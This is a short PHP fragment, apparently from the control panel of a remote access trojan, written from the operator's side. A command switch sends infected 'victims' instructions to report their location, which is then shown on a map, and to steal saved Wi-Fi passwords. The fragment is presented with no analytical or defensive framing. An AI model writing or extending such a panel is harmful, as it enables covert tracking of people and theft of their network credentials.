...
switch ($command) {
	...
	case "getlocation":
        Send($clientHWD, "GetLocation");
        $utils->show_alert("Victim Location Information Will Be Saved in Location.txt File in Some Minutes", "success", "check-circle");
        $utils->show_alert("Click on the Victim to see the Location.txt File", "success", "check-circle");
        break;		

	case "showlocation":
		$data = $client->getLocation(substr($clientHWD, 1, strlen($clientHWD)-2));
		$latitude = $data->latitude;
		$longitude = $data->longitude;
		$utils->redirect('getlocation.php?latitude=' . $latitude . '&longitude=' . $longitude);
    ...
    case 'stealwifi':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealWifiPassword");
        break;
